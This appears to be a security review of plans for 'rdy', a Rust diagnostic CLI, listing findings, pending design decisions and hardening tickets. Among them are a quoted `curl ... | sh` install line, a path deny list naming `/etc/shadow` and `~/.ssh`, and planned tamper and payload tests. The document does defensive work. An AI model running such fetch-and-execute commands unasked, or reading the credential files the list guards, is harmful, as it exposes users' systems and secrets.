- `docs/plan/rdy-plan.md`, How a POC flows, step 1: `rdy run acme-platform --token abc123`. The token on
  argv leaks into `ps`, shell history and CI logs, and resolving a spec by name over the network is M2.
  Fix: M1 flow is `rdy run ./acme-platform.yaml --trusted-key acme.pub`; M2 takes the token from
  `RDY_TOKEN`, `--token-file` or a prompt.
- CLAUDE.md, Names and places, and the plan's install line: `curl -sSf https://getrdy.io/install | sh`.
  Fix: `curl --proto '=https' --tlsv1.2 -sSf https://getrdy.io/install | sh`, plus a documented
  verify-first path.
- `docs/plan/rdy-plan.md`, crate table: `serde_yaml` was archived by its author in 2024, and the
  `serde_yml` fork has RUSTSEC-2025-0068 (unsound, no patched version). Fix: rust-architect picks a
  maintained parser in an ADR (candidates include `serde_yaml_ng` and `serde-saphyr`). The SEC-15 limits
  apply whichever is picked.
- `docs/plan/rdy-plan.md`, crate table lists `self_update`; CLAUDE.md lists a `self-update` command.
  Self-update is network plus binary replacement and is not in M1 scope. Fix: M3, SEC-49, same cosign
  verification as install.sh, never automatic.
- CLAUDE.md rule 2 ("Redaction runs before anything is written to disk") already binds M1 reports, but
  redactors live in `rdy-bundle`, which the plan schedules for M2. Fix: a minimal redaction core ships in
  M1 (SEC-25). Placement is an ADR.
- `docs/plan/rdy-plan.md`, Check families at launch: "Custom: a shell or script check ... sandboxed".
  Sandboxing scripts on four OSes is large and breaks the bounded-blast-radius promise. Fix: M4 or later,
  off unless `--allow-exec`, with its own threat model (SEC-53).
- `docs/plan/rdy-plan.md`, Example spec: `file:/etc/acme/*.yaml` implies arbitrary root file globs.
  Fix: 04-bundle-and-redaction.md defines a path policy with a deny list (`/etc/shadow`, `~/.ssh`, key
  files) and shows the resolved file list before collection.
- `docs/plan/rdy-plan.md`, Conversion flow, item 4: report links carry the vendor name to track
  click-through. Fix: state that these are click-only links, never auto-loaded images or beacons, and
  list the parameters on the docs security page.
- CLAUDE.md, rule 5 "rustls everywhere": underspecified for corporate TLS interception. With only bundled
  web roots, net checks and upload fail behind the proxies our users sit behind. Fix: use the platform
  trust store (`rustls-platform-verifier` or `rustls-native-certs`) and report interception as a finding.
- `docs/plan/rdy-plan.md`, crate table names the binary crate `rdy-cli`. CLAUDE.md says the crate is
  `rdy` in `crates/rdy-cli`. Fix: say so in the plan, and reserve `rdy-cli` on crates.io as a
  typosquat guard (SEC-11).
- `docs/plan/rdy-plan.md`, Release engineering: "the install script verifies checksums and signatures"
  does not say what happens when cosign is missing, which is the common case. Fix: the ADR below.

## Decisions needing an ADR

- install.sh when cosign is missing. Options: (a) fail closed with a manual path and a loud
  `RDY_INSECURE_SKIP_SIGNATURE=1` escape; (b) warn and continue on hash only; (c) also sign `SHA256SUMS`
  with a pinned ECDSA key that `openssl` can verify, keeping keyless cosign for transparency. Taken for
  M1: (a), the conservative option. (c) is the likely long-term answer but adds a long-lived key to
  protect. Owner: release-engineer.
- Vendor key trust model. Options: local pinning only; trust on first use; keys fetched from the vendor's
  domain (`/.well-known/`); keys published by the portal. Taken for M1: local pinning only. Owner:
  rust-architect with security-reviewer.
- Where the M1 redaction core lives: a module in `rdy-engine` that `rdy-bundle` reuses later, or
  `rdy-bundle` created early with only the redactor. No security difference, as long as M1 has it.
  Owner: rust-architect.
- Output dir confinement: `cap-std` directory handles, or hand-rolled `openat` with `O_NOFOLLOW` via
  `rustix` plus a Windows path. Conservative choice: `cap-std`, since it covers all four OSes. Owner:
  rust-architect.
- rustls crypto provider: `ring` (simpler musl cross builds) or `aws-lc-rs` (rustls default, FIPS path,
  needs an OpenSSL license exception). Owner: rust-architect with release-engineer.
- `--allow-unsigned` TTY confirmation: requiring a typed yes on a TTY may annoy scripted users. Taken:
  confirm on TTY, flag alone in non-TTY. Owner: cli-ux.
- Windows Authenticode and macOS notarization cost money (certificate or Azure signing, Apple developer
  account). Taken: defer to M3. Owner: release-engineer.

## Tickets implied

- [M1] SEC-01 Write deny.toml policy and CI job | owner: release-engineer | est: 2h | depends on: none | exit test: `cargo deny check` runs on every PR and fails on a test branch that adds `openssl`.
- [M1] SEC-02 Add scheduled advisory audit workflow | owner: release-engineer | est: 2h | depends on: SEC-01 Write deny.toml policy and CI job | exit test: a manual dispatch with a known-vulnerable crate pinned on a test branch opens a `security` issue.
- [M1] SEC-03 Harden GitHub Actions workflows | owner: release-engineer | est: 3h | depends on: none | exit test: zizmor reports zero findings, every action is SHA-pinned, and only the signing job has `id-token: write`.
- [M1] SEC-04 Harden GitHub org and repo settings | owner: security-reviewer | est: 2h | depends on: none | exit test: a checklist in the PR shows 2FA required, rulesets on main and `v*` tags, immutable releases, private vulnerability reporting, CODEOWNERS on security paths, release environment with manual approval.
- [M1] SEC-05 Harden getrdy.io domain and hosting accounts | owner: release-engineer | est: 2h | depends on: none | exit test: registrar lock, DNSSEC, CAA and HSTS verified with public tools and hardware-key MFA confirmed on registrar and Cloudflare.
- [M1] SEC-06 Sign release checksums with cosign keyless and self-verify | owner: release-engineer | est: 4h | depends on: SEC-03 Harden GitHub Actions workflows | exit test: a tag on a test repo produces `SHA256SUMS.sigstore.json` and the release job's own verify step passes with the pinned identity regexp.
- [M1] SEC-07 Attach SBOM and embed dependency list in release binaries | owner: release-engineer | est: 2h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: the release has a CycloneDX file and `cargo audit bin rdy` lists dependencies from the shipped binary.
- [M1] SEC-08 Build install.sh skeleton with root refusal and truncation guard | owner: release-engineer | est: 3h | depends on: none | exit test: shellcheck clean, refuses uid 0 without `--allow-root`, installs to `~/.local/bin`, never calls sudo.
- [M1] SEC-09 Add checksum and cosign verification to install.sh, fail closed | owner: release-engineer | est: 4h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify, SEC-08 Build install.sh skeleton with root refusal and truncation guard | exit test: installs a real release with cosign present and stops with the manual path when cosign is absent.
- [M1] SEC-10 Write install.sh tamper test suite | owner: qa-engineer | est: 3h | depends on: SEC-09 Add checksum and cosign verification to install.sh, fail closed | exit test: CI cases for bad hash, bad signature, wrong identity, missing cosign, root without flag and truncated script all exit nonzero and leave nothing installed.
- [M1] SEC-11 Reserve crates.io names and set up trusted publishing | owner: release-engineer | est: 1h | depends on: none | exit test: `rdy`, `rdy-cli` and every planned crate name are owned by the org account and publishing needs no stored token.
- [M1] SEC-12 Verify spec signatures over raw bytes before parsing | owner: rust-engineer | est: 4h | depends on: 01-spec-format signing section | exit test: tampered, truncated, wrong-key and weak-key cases fail; the parser spy shows no parse; the result records spec digest and key fingerprint.
- [M1] SEC-13 Add trusted key store and `--trusted-key` | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: an envelope carrying its own key fails as unknown key; a pinned key passes and its local label is shown.
- [M1] SEC-14 Implement `--allow-unsigned` warnings and watermark | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: env and config cannot enable it; golden HTML and JSON contain the unsigned watermark; TTY asks with default no.
- [M1] SEC-15 Harden spec parser limits and strictness | owner: rust-engineer | est: 4h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: proptest and fixtures reject oversize, deep nesting, anchors, aliases, duplicate keys, multi-document input, unknown fields and unknown check ids with exit 64.
- [M1] SEC-16 Harden `rdy spec` key generation and signing | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: generated key is 0600 via exclusive create, a 0644 key is refused, and no secret bytes appear in output or logs.
- [M1] SEC-17 Build the probe facade and action log | owner: rust-engineer | est: 4h | depends on: 02-engine-design probe facade API | exit test: a fixture run's JSON action log lists every command, file, endpoint and kube request the checks used, and a lint fails on `std::process::Command` outside the facade.
- [M1] SEC-18 Enforce command execution policy in the facade | owner: rust-engineer | est: 3h | depends on: SEC-17 Build the probe facade and action log | exit test: tests show no shell, fixed PATH when euid 0, scrubbed loader env, sudo-family refused, timeout and 1 MiB output cap enforced.
- [M1] SEC-19 Confine all writes to a new output directory | owner: rust-engineer | est: 4h | depends on: none | exit test: a pre-planted symlink is not followed, an existing dir is refused, modes are 0700 and 0600, and a killed run leaves no partial file.
- [M1] SEC-20 Refuse setuid execution | owner: rust-engineer | est: 1h | depends on: none | exit test: unit test shows exit 70 with a fix hint when real and effective uid differ.
- [M1] SEC-21 Enforce network policy for net checks | owner: check-author | est: 4h | depends on: SEC-17 Build the probe facade and action log | exit test: unlisted, link-local and metadata targets are refused, endpoint count is capped, bodies are never stored, bandwidth sample respects byte and time caps.
- [M1] SEC-22 Add no-phone-home integration tests | owner: qa-engineer | est: 3h | depends on: SEC-21 Enforce network policy for net checks | exit test: a no-net spec passes under `unshare -rn` on Linux CI and a contact-set test shows only spec endpoints were contacted.
- [M1] SEC-23 Enforce Kubernetes request allowlist | owner: rust-engineer | est: 4h | depends on: SEC-17 Build the probe facade and action log | exit test: a mock API server records every request from the k8s suite and the test asserts read verbs, access reviews and dry-run only, with no `secrets` access.
- [M1] SEC-24 Ship read-only ClusterRole and show kube identity | owner: k8s-expert | est: 3h | depends on: SEC-23 Enforce Kubernetes request allowlist | exit test: the M1 k8s checks pass on a kind cluster using only `examples/rbac/rdy-readonly.yaml`, and the report shows context, server and user.
- [M1] SEC-25 Build minimal redactor for reports and evidence | owner: rust-engineer | est: 4h | depends on: redaction placement ADR | exit test: every evidence string passes through it before write and the M1 corpus passes with zero misses.
- [M1] SEC-26 Create M1 redaction corpus and golden tests | owner: qa-engineer | est: 3h | depends on: SEC-25 Build minimal redactor for reports and evidence | exit test: at least 60 synthetic cases across the M1 categories, including chunk-boundary and negative cases, run in CI.
- [M1] SEC-27 Harden HTML report rendering | owner: rust-engineer | est: 3h | depends on: HTML report contract in 01-spec-format | exit test: golden test with script and markup payloads renders inert text, CSP meta is present, and no remote resource is referenced.
- [M1] SEC-28 Sanitize untrusted strings in terminal output | owner: cli-ux | est: 2h | depends on: none | exit test: ANSI and control sequences in fixture output are escaped before printing.
- [M1] SEC-29 Redact logs and cap dependency log levels | owner: rust-engineer | est: 3h | depends on: SEC-25 Build minimal redactor for reports and evidence | exit test: at `RUST_LOG=trace` with canary secrets in env and kubeconfig, no canary appears in stderr.
- [M1] SEC-30 Enforce `forbid(unsafe_code)` in every crate | owner: rust-engineer | est: 1h | depends on: none | exit test: a CI check fails when any crate root lacks the attribute.
- [M1] SEC-31 Write the docs security page | owner: docs-writer | est: 3h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: page lists what rdy reads and contacts, report fields, report link parameters, verify-first install and air-gap install, and CI runs its verification commands against the latest release.
- [M1] SEC-32 Enable vulnerability reporting channels | owner: security-reviewer | est: 1h | depends on: SEC-04 Harden GitHub org and repo settings | exit test: private vulnerability reporting is on, security@getrdy.io receives mail, and security.txt is served on getrdy.io.
- [M2] SEC-40 Add `rdy run --plan` preview | owner: rust-engineer | est: 6h | depends on: SEC-17 Build the probe facade and action log | exit test: plan output matches the action log of a real run on the same fixtures.
- [M2] SEC-41 Build upload client with consent, receipt and exact bytes | owner: rust-engineer | est: 12h | depends on: SEC-42 Define share-link token format and scope | exit test: fake-server tests prove no upload without consent, exact bytes, digests in receipt, response ignored beyond receipt id.
- [M2] SEC-42 Define share-link token format and scope | owner: security-reviewer | est: 6h | depends on: none | exit test: token spec with `rdy_st_` prefix, write-only scope, expiry and revocation agreed with rdy-cloud and covered by the redaction corpus.
- [M2] SEC-43 Define bundle collector path policy | owner: security-reviewer | est: 6h | depends on: 04-bundle-and-redaction | exit test: deny-listed paths and symlink escapes are refused in fixture tests and the resolved file list is shown before collection.
- [M2] SEC-44 Grow redaction corpus to full M2 set | owner: qa-engineer | est: 10h | depends on: SEC-26 Create M1 redaction corpus and golden tests | exit test: at least 300 cases across all categories with zero misses.
- [M2] SEC-45 Add fuzz targets for spec parser and redactor | owner: qa-engineer | est: 6h | depends on: SEC-15 Harden spec parser limits and strictness | exit test: scheduled fuzz job runs 30 minutes per target weekly with no crashes.
- [M2] SEC-46 Add vendor key rotation, revocation and spec expiry | owner: rust-architect | est: 8h | depends on: SEC-13 Add trusted key store and `--trusted-key` | exit test: an expired spec warns, a revoked key fails, a rotated key passes.
- [M2] SEC-47 Threat-model portal-delivered specs | owner: security-reviewer | est: 4h | depends on: SEC-46 Add vendor key rotation, revocation and spec expiry | exit test: written decision on who holds vendor signing keys in the portal and how the CLI pins them.
- [M2] SEC-55 Add openssl pinned-key fallback to install.sh if the ADR picks it | owner: release-engineer | est: 6h | depends on: install.sh cosign ADR | exit test: install verifies on a host with openssl and no cosign.
- [M3] SEC-48 Enforce read-only cloud API allowlist | owner: cloud-iam-expert | est: 6h | depends on: SEC-17 Build the probe facade and action log | exit test: a test enumerates every AWS operation the cloud checks can call and all are read-only or simulate.
- [M3] SEC-49 Build verified, explicit self-update | owner: release-engineer | est: 12h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: tampered or wrong-identity release is refused and the command never runs unprompted.
- [M3] SEC-50 Sign Windows and macOS binaries | owner: release-engineer | est: 8h | depends on: code signing ADR | exit test: Authenticode and notarization verify on clean VMs.
- [M3] SEC-51 Verify reproducible builds | owner: release-engineer | est: 8h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: two independent builds of a tag match or deviations are documented.
- [M3] SEC-52 Adopt cargo-vet audits for direct dependencies | owner: security-reviewer | est: 6h | depends on: SEC-01 Write deny.toml policy and CI job | exit test: `cargo vet` passes in CI.
- [M4] SEC-53 Design sandboxed custom exec checks behind `--allow-exec` | owner: security-reviewer | est: 16h | depends on: SEC-17 Build the probe facade and action log | exit test: own threat model approved and exec is unreachable without the flag.
- [M5] SEC-54 Commission independent security audit | owner: security-reviewer | est: 8h | depends on: none | exit test: report received and every high finding has a fix ticket.
